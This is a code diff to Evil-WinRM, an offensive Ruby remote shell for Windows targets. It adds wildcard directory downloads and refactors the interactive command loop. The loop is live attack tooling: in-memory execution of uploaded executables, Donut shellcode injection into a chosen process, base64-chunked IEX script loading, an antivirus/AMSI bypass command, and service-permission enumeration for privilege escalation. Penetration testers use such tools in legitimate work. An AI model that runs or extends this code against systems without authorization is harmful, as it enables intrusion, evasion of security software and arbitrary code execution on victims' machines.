@@ -64,9 +64,9 @@ module WinRM
       def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
         @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
         index = 0
+        return download_dir(remote_path, local_path, chunk_size, false) if remote_path.match?(/(\*\.|\*\*|\.\*|\*)/)
         output = _output_from_file(remote_path, chunk_size, index)
-
-        return download_dir(remote_path, local_path, chunk_size, first) if output.exitcode == 2
+        return download_dir(remote_path, local_path, chunk_size, true) if output.exitcode == 2
         return false if output.exitcode >= 1
 
         File.open(local_path, 'wb') do |fd|
@@ -85,6 +85,22 @@ module WinRM
             @logger.debug("IO Failed: " + err.to_s)
             raise
           end
+        end
+      end
+
+      def download_dir(remote_path, local_path, chunk_size, first)
+        index_exp = remote_path.index(/(\*\.|\*\*|\.\*|\*)/) || 0
+        remote_file_path = remote_path
+
+        if index_exp > 0
+          index_last_folder = remote_file_path.rindex(/[\\\/]/, index_exp)
+          remote_file_path = remote_file_path[0..index_last_folder-1]
+        end
+
+        FileUtils.mkdir_p(local_path) unless File.directory?(local_path)
+        command = "Get-ChildItem #{remote_path} | Select-Object Name"
+        @connection.shell(:powershell) { |e| e.run(command) }.stdout.strip.split(/\n/).drop(2).each do |file|
+          download(File.join(remote_file_path.to_s, file.strip), File.join(local_path, file.strip), chunk_size, false)
         end
       end
 
@@ -462,12 +478,14 @@ class EvilWinRM
 
   # Progress bar
   def progress_bar(bytes_done, total_bytes)
+    $stdout.sync = true
     progress = ((bytes_done.to_f / total_bytes) * 100).round
     progress_bar = (progress / 10).round
     progress_string = '▓' * (progress_bar - 1).clamp(0, 9)
     progress_string = "#{progress_string}▒#{'░' * (10 - progress_bar)}"
     message = "Progress: #{progress}% : |#{progress_string}|          \r"
     print message
+    sleep 0.1
   end
 
   # Get filesize
@@ -532,122 +550,134 @@ class EvilWinRM
       print_message('Establishing connection to remote endpoint', TYPE_INFO)
       $conn.shell(:powershell) do |shell|
         begin
-          completion =
-            proc do |str|
-              case
-              when Readline.line_buffer =~ /help.*/i
-                      puts($LIST.join("\t").to_s)
-              when Readline.line_buffer =~ /Invoke-Binary.*/i
-                      result = @executables.grep(/^#{Regexp.escape(str)}/i) || []
-                      if result.empty?
-                          paths = self.paths(str)
-                          result.concat(paths.grep(/^#{Regexp.escape(str)}/i))
-                      end
-                      result.uniq
-              when Readline.line_buffer =~ /donutfile.*/i
-                      paths = self.paths(str)
-                      paths.grep(/^#{Regexp.escape(str)}/i)
-              when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
-                      $DONUTPARAM2.grep(/^#{Regexp.escape(str)}/i) unless str.nil?
-              when Readline.line_buffer =~ /Donut-Loader.*/i
-                      $DONUTPARAM1.grep(/^#{Regexp.escape(str)}/i) unless str.nil?
-              when Readline.line_buffer =~ /^upload.*/i
-                      test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
-                      if test_s.count(' ') < 2
-                          self.paths(str) || []
-                      else
-                          complete_path(str, shell) || []
-                      end
-              when Readline.line_buffer =~ /^download.*/i
-                      test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
-                      if test_s.count(' ') < 2
-                          complete_path(str, shell) || []
-                      else
-                          paths = self.paths(str)
-                      end
-              when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ %r{^"?(\./|\.\./|[a-z,A-Z]:/|~/|/)}))
-                      result = $COMMANDS.grep(/^#{Regexp.escape(str)}/i) || []
-                      result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
-                      result.uniq
-                else
-                      result = []
-                      result.concat(complete_path(str, shell) || [])
-                      result
+          completion = proc do |str|
+            case
+            when Readline.line_buffer =~ /help.*/i
+              puts($LIST.join("\t").to_s)
+            when Readline.line_buffer =~ /Invoke-Binary.*/i
+              result = @executables.grep(/^#{Regexp.escape(str)}/i) || []
+              if result.empty?
+                paths = self.paths(str)
+                result.concat(paths.grep(/^#{Regexp.escape(str)}/i))
               end
+              result.uniq
+            when Readline.line_buffer =~ /donutfile.*/i
+              paths = self.paths(str)
+              paths.grep(/^#{Regexp.escape(str)}/i)
+            when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
+              $DONUTPARAM2.grep(/^#{Regexp.escape(str)}/i) unless str.nil?
+            when Readline.line_buffer =~ /Donut-Loader.*/i
+              $DONUTPARAM1.grep(/^#{Regexp.escape(str)}/i) unless str.nil?
+            when Readline.line_buffer =~ /^upload.*/i
+              test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
+              if test_s.count(' ') < 2
+                self.paths(str) || []
+              else
+                complete_path(str, shell) || []
+              end
+            when Readline.line_buffer =~ /^download.*/i
+              test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
+              if test_s.count(' ') < 2
+                complete_path(str, shell) || []
+              else
+                paths = self.paths(str)
+              end
+            when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ %r{^"?(\./|\.\./|[a-z,A-Z]:/|~/|/)}))
+              result = $COMMANDS.grep(/^#{Regexp.escape(str)}/i) || []
+              result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
+              result.uniq
+            else
+              result = []
+              result.concat(complete_path(str, shell) || [])
+              result
             end
+          end
 
           Readline.completion_proc = completion
           Readline.completion_append_character = ''
           Readline.completion_case_fold = true
           Readline.completer_quote_characters = '"'
 
-          until command == 'exit'
+          until command == 'exit' do
             pwd = shell.run('(get-location).path').output.strip
+            if $colors_enabled
+              command = Readline.readline( "#{colorize('*Evil-WinRM*', 'red')}#{colorize(' PS ', 'yellow')}#{pwd}> ", true)
+            else
+              command = Readline.readline("*Evil-WinRM* PS #{pwd}> ", true)
+            end
+            $logger&.info("*Evil-WinRM* PS #{pwd} > #{command}")
 
-              command = if $colors_enabled
-                          Readline.readline(
-                            "#{colorize('*Evil-WinRM*', 'red')}#{colorize(' PS ', 'yellow')}#{pwd}> ", true
-                          )
-                        else
-                          Readline.readline("*Evil-WinRM* PS #{pwd}> ", true)
-                        end
-              $logger&.info("*Evil-WinRM* PS #{pwd} > #{command}")
+            if command.start_with?('upload')
+              if docker_detection
+                puts("")
+                print_message('Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command', TYPE_WARNING, true, $logger)
+              end
+              begin
+                source_s = ""
+                dest_s = ""
+                paths = get_paths_from_command(command, pwd)
 
-              if command.start_with?('upload')
-                if docker_detection
-                    puts
-                    print_message('Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command', TYPE_WARNING, true, $logger)
+                if paths.length == 2
+                  dest_s = paths.pop
+                  source_s = paths.pop
+                elsif paths.length == 1
+                  source_s = paths.pop
+                  dest_s = "#{pwd}\\#{extract_filename(dest_s)}"
                 end
-                begin
-                  source_s = ""
-                  dest_s = ""
-                  paths = get_paths_from_command(command, pwd)
-
-                  if paths.length == 2
-                    dest_s = paths.pop
-                    source_s = paths.pop
-                  elsif paths.length == 1
-                    source_s = paths.pop
-                    dest_s = "#{pwd}\\#{extract_filename(dest_s.gsub("\\", '/'))}"
-                  end
-
+                if extract_filename(source_s).empty? || extract_filename(source_s).include?("*")
+                  print_message("A filename must be specified!", TYPE_ERROR, true, $logger)
+                else
+                  source_s = source_s.gsub("\\", "/") unless Gem.win_platform?
+                  dest_s = dest_s.gsub("/", "\\")
                   print_message("Uploading #{source_s} to #{dest_s}", TYPE_INFO, true, $logger)
-                  file_manager.upload(source_s, dest_s) do |bytes_copied, total_bytes|
+                  upl_result = file_manager.upload(source_s, dest_s) do |bytes_copied, total_bytes, x, y|
                     progress_bar(bytes_copied, total_bytes)
                     if bytes_copied == total_bytes
                       puts('                                                             ')
                       print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA, true, $logger)
-                      print_message('Upload successful!', TYPE_INFO, true, $logger)
                     end
                   end
-                rescue StandardError => e
-                  print_message("#{e}: #{e.backtrace}", TYPE_ERROR, true, $logger)
-                  print_message('Upload failed. Check filenames or paths', TYPE_ERROR, true, $logger)
-                ensure
-                  command = ''
+                  print_message('Upload successful!', TYPE_INFO, true, $logger)
                 end
-              elsif command.start_with?('download')
-                if docker_detection
-                    puts
-                    print_message(
-                      'Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command', TYPE_WARNING, true, $logger
-                    )
-                end
-
-                begin
-                  dest = ""
-                  source = ""
-                  paths = get_paths_from_command(command, pwd)
-
-                  if paths.length == 2
-                    dest = paths.pop
-                    source = paths.pop
-                  elsif paths.length == 1
-                    source = paths.pop
-                    dest = "#{extract_filename(source.gsub("\\", '/'))}"
+              rescue StandardError => e
+                # print_message("#{e}: #{e.backtrace}", TYPE_ERROR, true, $logger)
+                print_message('Upload failed. Check filenames or paths', TYPE_ERROR, true, $logger)
+              ensure
+                command = ''
+              end
+            elsif command.start_with?('download')
+              if docker_detection
+                puts("")
+                print_message('Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command', TYPE_WARNING, true, $logger)
+              end
+              begin
+                dest = ""
+                source = ""
+                paths = get_paths_from_command(command, pwd)
+                if paths.length == 2
+                  dest = paths.pop
+                  source = paths.pop
+                elsif paths.length == 1
+                  source = paths.pop
+                  source_expr_i = source.index(/(\*\.|\*\*|\.\*|\*)/) || -1
+                  if source_expr_i < 0
+                    dest = "#{extract_filename(source)}"
+                  else
+                    index_last_folder = source.rindex(/[\\\/]/, source_expr_i)
+                    dest = "#{extract_filename(source[0..index_last_folder])}"
                   end
-                  print_message("Downloading #{source} to #{dest}", TYPE_INFO, true, $logger)
+                end
+
+                if dest.match?(/(\.\/|\/)$/)
+                  dest = "#{extract_filename(source)}"
+                end
+
+                if extract_filename(source).empty?
+                  print_message("A filename or folder must be specified!", TYPE_ERROR, true, $logger)
+                else
                   size = filesize(shell, source)
+                  dest = dest.gsub("\\", "/") unless Gem.win_platform?
+                  print_message("Downloading #{source} to #{dest}", TYPE_INFO, true, $logger)
                   downloaded = file_manager.download(source, dest, size: size) do |index, size|
                     progress_bar(index, size)
                   end
@@ -657,156 +687,149 @@ class EvilWinRM
                   else
                     print_message('Download failed. Check filenames or paths', TYPE_ERROR, true, $logger)
                   end
-                rescue StandardError => e
-                    print_message('Download failed. Check filenames or paths: ' + e.to_s, TYPE_ERROR, true, $logger)
-                ensure
-                    command = ''
                 end
-              elsif command.start_with?('Invoke-Binary')
-                begin
-                    invoke_Binary = command.tokenize
-                    command = ''
-                    if !invoke_Binary[1].to_s.empty?
-                        load_executable = invoke_Binary[1]
-                        load_executable = File.binread(load_executable)
-                        load_executable = Base64.strict_encode64(load_executable)
-                        if !invoke_Binary[2].to_s.empty?
-                            output = shell.run("Invoke-Binary #{load_executable} ,#{invoke_Binary[2]}")
-                            puts(output.output)
-                        elsif invoke_Binary[2].to_s.empty?
-                            output = shell.run("Invoke-Binary #{load_executable}")
-                            puts(output.output)
-                        end
-                    elsif (output = shell.run('Invoke-Binary'))
-                        puts(output.output)
-                    end
-                rescue StandardError => e
-                    print_message('Check filenames', TYPE_ERROR, true, $logger)
-                end
-
-              elsif command.start_with?('Donut-Loader')
-                begin
-                    donut_Loader = command.tokenize
-                    command = ''
-                    unless donut_Loader[4].to_s.empty?
-                        pid = donut_Loader[2]
-                        load_executable = donut_Loader[4]
-                        load_executable = File.binread(load_executable)
-                        load_executable = Base64.strict_encode64(load_executable)
-                        output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
-                      end
-                    print(output.output)
-                    $logger&.info(output.output)
-                rescue StandardError
-                    print_message('Check filenames', TYPE_ERROR, true, $logger)
-                end
-
-              elsif command.start_with?('services')
+              rescue StandardError => e
+                print_message('Download failed. Check filenames or paths: ' + e.to_s, TYPE_ERROR, true, $logger)
+              ensure
                 command = ''
-                  output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
-                  print(output.output.chomp)
-                  $logger&.info(output.output.chomp)
-              elsif command.start_with?(*@functions)
-                silent_warnings do
-                    load_script = $scripts_path + command
-                    command = ''
-                    load_script = load_script.gsub(' ', '')
-                    load_script = File.binread(load_script)
-                    load_script = Base64.strict_encode64(load_script)
-                    script_split = load_script.scan(/.{1,5000}/)
-                    script_split.each do |item|
-                        output = shell.run("$a += '#{item}'")
-                    end
-                    output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
-                    output = shell.run('$a = $null')
+              end
+            elsif command.start_with?('Invoke-Binary')
+              begin
+                invoke_Binary = command.tokenize
+                command = ''
+                if !invoke_Binary[1].to_s.empty?
+                  load_executable = invoke_Binary[1]
+                  load_executable = File.binread(load_executable)
+                  load_executable = Base64.strict_encode64(load_executable)
+                  if !invoke_Binary[2].to_s.empty?
+                    output = shell.run("Invoke-Binary #{load_executable} ,#{invoke_Binary[2]}")
+                    puts(output.output)
+                  elsif invoke_Binary[2].to_s.empty?
+                    output = shell.run("Invoke-Binary #{load_executable}")
+                    puts(output.output)
+                  end
+                elsif (output = shell.run('Invoke-Binary'))
+                  puts(output.output)
+                end
+              rescue StandardError => e
+                print_message('Check filenames', TYPE_ERROR, true, $logger)
+              end
+            elsif command.start_with?('Donut-Loader')
+              begin
+                donut_Loader = command.tokenize
+                command = ''
+                unless donut_Loader[4].to_s.empty? then
+                    pid = donut_Loader[2]
+                    load_executable = donut_Loader[4]
+                    load_executable = File.binread(load_executable)
+                    load_executable = Base64.strict_encode64(load_executable)
+                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
+                end
+                print(output.output)
+                $logger&.info(output.output)
+              rescue StandardError
+                print_message('Check filenames', TYPE_ERROR, true, $logger)
+              end
+            elsif command.start_with?('services')
+              command = ''
+              output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
+              print(output.output.chomp)
+              $logger&.info(output.output.chomp)
+            elsif command.start_with?(*@functions)
+              silent_warnings do
+                load_script = $scripts_path + command
+                command = ''
+                load_script = load_script.gsub(' ', '')
+                load_script = File.binread(load_script)
+                load_script = Base64.strict_encode64(load_script)
+                script_split = load_script.scan(/.{1,5000}/)
+                script_split.each do |item|
+                  output = shell.run("$a += '#{item}'")
                 end
 
-              elsif command.start_with?('menu')
-                command = ''
-                  silent_warnings do
-                    unless @psLoaded
-                        shell.run(donuts)
-                        shell.run(invokeBin)
-                        shell.run(dllloader)
-                        @psLoaded = true
-                    end
-                      output = shell.run(menu)
-                      puts(get_banner)
-                      output = shell.run('Menu')
-                      autocomplete = shell.run('auto').output.chomp
-                      autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
-                      assemblyautocomplete = shell.run('show-methods-loaded').output.chomp
-                      assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
-                      unless assemblyautocomplete.to_s.empty?
-                        $LISTASSEMNOW = assemblyautocomplete.split("\n")
-                          $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
-                      end
-                      $LIST2 = autocomplete.split("\n")
-                      $LIST = $LIST + $LIST2
-                      $COMMANDS = $COMMANDS + $LIST2
-                      $COMMANDS = $COMMANDS.uniq
-                      message_output = output.output.chomp + '[+] ' + $CMDS.join("\n").gsub(/\n/,
-                                                                                            "\n[+] ") + "\n\n"
-                      puts(message_output)
-                      $logger&.info(message_output)
-                  end
-
-              elsif command == 'Bypass-4MSI'
-                command = ''
-                  timeToWait = (time + 20) - Time.now.to_i
-
-                  if timeToWait.positive?
-                    puts
-                      print_message(
-                        'AV could be still watching for suspicious activity. Waiting for patching...', TYPE_WARNING, true, $logger
-                      )
-                      @blank_line = true
-                      sleep(timeToWait)
-                  end
-                  unless @Bypass_4MSI_loaded
-                    load_Bypass_4MSI(shell)
-                      @Bypass_4MSI_loaded = true
-                  end
+                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
+                output = shell.run('$a = $null')
               end
-              output = shell.run(command) do |stdout, stderr|
-                stdout&.each_line do |line|
-                    $stdout.puts(line.rstrip!)
+            elsif command.start_with?('menu')
+              command = ''
+              silent_warnings do
+                unless @psLoaded
+                    shell.run(donuts)
+                    shell.run(invokeBin)
+                    shell.run(dllloader)
+                    @psLoaded = true
                 end
-                  $stderr.print(stderr)
-              end
-              next unless !$logger.nil? && !command.empty?
+                output = shell.run(menu)
+                puts(get_banner)
+                output = shell.run('Menu')
+                autocomplete = shell.run('auto').output.chomp
+                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
+                assemblyautocomplete = shell.run('show-methods-loaded').output.chomp
+                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
+                unless assemblyautocomplete.to_s.empty?
+                  $LISTASSEMNOW = assemblyautocomplete.split("\n")
+                  $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
+                end
 
-              output_logger = ''
-              output.output.each_line do |line|
-                output_logger += "#{line.rstrip!}\n"
+                $LIST2 = autocomplete.split("\n")
+                $LIST = $LIST + $LIST2
+                $COMMANDS = $COMMANDS + $LIST2
+                $COMMANDS = $COMMANDS.uniq
+                message_output = output.output.chomp + '[+] ' + $CMDS.join("\n").gsub(/\n/,"\n[+] ") + "\n\n"
+                puts(message_output)
+                $logger&.info(message_output)
               end
-              $logger.info(output_logger)
+            elsif command == 'Bypass-4MSI'
+              command = ''
+              timeToWait = (time + 20) - Time.now.to_i
+              if timeToWait.positive?
+                puts("")
+                print_message('AV could be still watching for suspicious activity. Waiting for patching...', TYPE_WARNING, true, $logger)
+                @blank_line = true
+                sleep(timeToWait)
+              end
+              unless @Bypass_4MSI_loaded
+                load_Bypass_4MSI(shell)
+                @Bypass_4MSI_loaded = true
+              end
+            end
+
+            output = shell.run(command) do |stdout, stderr|
+              stdout&.each_line do |line|
+                $stdout.puts(line.rstrip!)
+              end
+              $stderr.print(stderr)
+            end
+
+            next unless !$logger.nil? && !command.empty?
+            output_logger = ''
+            output.output.each_line do |line|
+              output_logger += "#{line.rstrip!}\n"
+            end
+            $logger.info(output_logger)
           end
         rescue Errno::EACCES => e
-        puts
-          print_message("An error of type #{e.class} happened, message is #{e.message}", TYPE_ERROR,
-                        true, $logger)
+          puts("\n\n")
+          print_message("An error of type #{e.class} happened, message is #{e.message}", TYPE_ERROR, true, $logger)
           retry
         rescue Interrupt
-        puts("\n\n")
-          print_message('Press "y" to exit, press any other key to continue', TYPE_WARNING, true,
-                        $logger)
+          puts("\n\n")
+          print_message('Press "y" to exit, press any other key to continue', TYPE_WARNING, true, $logger)
           if $stdin.getch.downcase == 'y'
             custom_exit(130)
           else
             retry
           end
         end
+
         custom_exit(0)
       end
     rescue SystemExit
     rescue SocketError
-      print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true,
-                    $logger)
+      print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true, $logger)
       custom_exit(1)
     rescue Exception => e
-      print_message("An error of type #{e.class} happened, message is #{e.message}", TYPE_ERROR, true,
-                    $logger)
+      print_message("An error of type #{e.class} happened, message is #{e.message}", TYPE_ERROR, true, $logger)
       custom_exit(1)
     end
   end
@@ -879,14 +902,8 @@ class EvilWinRM
 
   def extract_filename(path)
     path = path || ""
+    path = path.gsub("\\", '/')
     path.split('/')[-1]
-  end
-
-  def extract_next_quoted_path(cmd_with_quoted_path)
-    begin_i = cmd_with_quoted_path.index('"')
-    l_total = cmd_with_quoted_path.length
-    next_i = cmd_with_quoted_path[begin_i + 1, l_total - begin_i].index('"')
-    cmd_with_quoted_path[begin_i + 1, next_i]
   end
 
   def get_paths_from_command(command, pwd)
